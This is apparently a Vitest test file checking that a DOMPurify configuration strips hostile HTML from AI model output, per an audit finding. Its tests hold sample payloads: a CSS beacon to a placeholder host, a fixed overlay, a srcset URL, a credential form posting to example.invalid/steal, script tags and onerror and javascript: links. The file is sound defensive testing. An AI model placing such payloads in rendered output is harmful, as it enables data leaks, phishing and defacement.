// @vitest-environment jsdom
//
// jsdom is required for the second half of this file. The first half pins the
// boundary; the second half RUNS it, because a pinned config that DOMPurify
// ignores would pass the first half and leave the bug in place. Turning it on is
// also what disproved part of the original finding — see the third test.
import DOMPurify from "dompurify";
import { describe, expect, it } from "vitest";

import { SANITIZE_CONFIG, sanitizeHtml } from "./sanitizeConfig";

// AUDIT F58. Model output is untrusted HTML by definition — it arrives from
// RAG-indexed documents, MCP results and files the model read — and marked
// passes raw HTML straight through. DOMPurify WAS applied, but with its stock
// config.

describe("the sanitizer boundary (AUDIT F58)", () => {
  it("forbids the elements whose reach escapes the transcript", () => {
    // The form elements are the phishing shape. <style> and the embedded-content
    // elements are here as belt-and-braces: stock already strips all four, and
    // naming them means a future DOMPurify that stopped doing so could not widen
    // this boundary silently.
    for (const tag of ["style", "form", "input", "button", "textarea",
                       "select", "iframe", "object", "embed"]) {
      expect(SANITIZE_CONFIG.FORBID_TAGS).toContain(tag);
    }
  });

  it("forbids the attributes that carry the same reach", () => {
    // `style` is the one that actually matters: it is where background:url() and
    // position:fixed live. `action` is where a form posts; `srcset` is a second
    // image URL.
    for (const attr of ["style", "action", "formaction", "srcset"]) {
      expect(SANITIZE_CONFIG.FORBID_ATTR).toContain(attr);
    }
  });

  it("applies the boundary rather than the stock config", () => {
    // The original bug was a sanitiser called with NO config. Defining the
    // config is not the fix; passing it is.
    const seen: (unknown)[] = [];
    const spy = (html: string, cfg?: unknown) => {
      seen.push(cfg);
      return html;
    };

    const out = sanitizeHtml("<p style=\"color:red\">hi</p>", spy);

    // the sanitiser's result is what comes back, unchanged
    expect(out).toBe("<p style=\"color:red\">hi</p>");
    expect(seen).toHaveLength(1);
    expect(seen[0]).toBe(SANITIZE_CONFIG);
    expect(seen[0]).not.toBeUndefined();
  });
});

// --- and now the part that actually executes DOMPurify ----------------------

const real = (html: string) => sanitizeHtml(html, DOMPurify.sanitize);
const stock = (html: string) => DOMPurify.sanitize(html);

describe("the sanitizer, executed (AUDIT F58)", () => {
  it("strips the style attribute, which is the vector that was really open", () => {
    // Measured against dompurify 3.4.12: the stock config KEEPS an inline style,
    // and `background:url()` inside one is an outbound request the moment the
    // reply renders.
    const payload = '<p style="background:url(https://example.invalid/beacon)">x</p>';

    expect(stock(payload)).toContain("example.invalid");
    expect(real(payload)).not.toContain("example.invalid");
    expect(real(payload)).not.toContain("style=");
    expect(real(payload)).toContain("x");
  });

  it("strips a full-viewport overlay, which is the defacement shape", () => {
    const payload = '<p style="position:fixed;top:0;left:0;width:100vw;' +
      'height:100vh;background:red">x</p>';
    expect(stock(payload)).toContain("position:fixed");
    expect(real(payload)).not.toContain("position:fixed");
  });

  it("strips the srcset attribute, a second image URL", () => {
    const payload = '<img srcset="https://example.invalid/a 1x">';
    expect(stock(payload)).toContain("example.invalid");
    expect(real(payload)).not.toContain("example.invalid");
  });

  it("strips forms and inputs, so a reply cannot ask for credentials", () => {
    const payload = '<form action="https://example.invalid/steal">' +
      '<input name="pw"></form>';
    expect(stock(payload)).toContain("<form");
    expect(real(payload)).not.toContain("<form");
    expect(real(payload)).not.toContain("<input");
    expect(real(payload)).not.toContain("example.invalid");
  });

  it("already stripped <style>, which is where the original finding was wrong", () => {
    // AUDIT F58 led with "DOMPurify's stock allowlist includes <style>" and the
    // story that one arriving in model output "restyles the whole app". It does
    // not: the stock config removes the element outright. This test records the
    // correction, so the claim is not quietly re-inherited. If it starts failing,
    // DOMPurify changed its defaults and the reasoning in sanitizeConfig.ts needs
    // re-reading rather than trusting.
    const payload = "<style>body{display:none}</style><p>hello</p>";
    expect(stock(payload)).not.toContain("<style");
    expect(stock(payload)).toContain("hello");
    // The shipped path agrees.
    expect(real(payload)).not.toContain("<style");
  });

  it("already stripped iframe, object and embed too", () => {
    for (const payload of ['<iframe src="https://example.invalid"></iframe>',
                           '<object data="https://example.invalid"></object>',
                           '<embed src="https://example.invalid">']) {
      expect(stock(payload)).not.toContain("example.invalid");
    }
  });

  it("still strips script and event handlers, which were never the gap", () => {
    // A regression guard on the thing everyone assumes is covered: if the config
    // were malformed, DOMPurify could fall back and these would survive.
    expect(real("<script>alert(1)</script>ok")).not.toContain("<script");
    expect(real('<img src=x onerror="alert(1)">')).not.toContain("onerror");
    expect(real('<a href="javascript:alert(1)">x</a>')).not.toContain("javascript:");
  });

  it("leaves ordinary model output alone", () => {
    // The boundary must not be so eager that it mangles a normal reply.
    const out = real('<p>Use <code>--ctx 65536</code> and <b>reload</b>.</p>');
    expect(out).toContain("<code>--ctx 65536</code>");
    expect(out).toContain("<b>reload</b>");
  });
});
